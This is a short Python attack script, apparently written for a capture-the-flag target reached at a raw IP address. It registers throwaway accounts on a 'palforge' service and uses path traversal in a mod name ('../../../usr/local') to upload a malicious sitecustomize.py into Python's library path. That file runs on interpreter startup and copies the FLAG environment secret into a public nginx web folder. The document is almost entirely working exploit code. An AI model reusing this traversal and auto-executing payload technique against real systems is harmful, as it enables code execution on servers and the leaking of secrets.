import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
sc = b'import os\ntry:\n    open("/usr/share/nginx/html/final.txt","w").write(os.environ.get("FLAG","NOFLAG")+"\\n")\nexcept Exception: pass\n'
for i in range(2):
    tok,u=fresh()
    try:
        pid=pf.create_platform(tok,"lib/python3.11",name="z"); mid=pf.create_mod(tok,"../../../usr/local",title="z"); bid=pf.create_build(tok,mid,pid)
        r=pf.upload_zip(tok,mid,bid,{"sitecustomize.py": sc})
        print("attempt",i,"->",r.status_code, r.text[:200])
    except Exception as e:
        print("attempt",i,"ERR",repr(e))
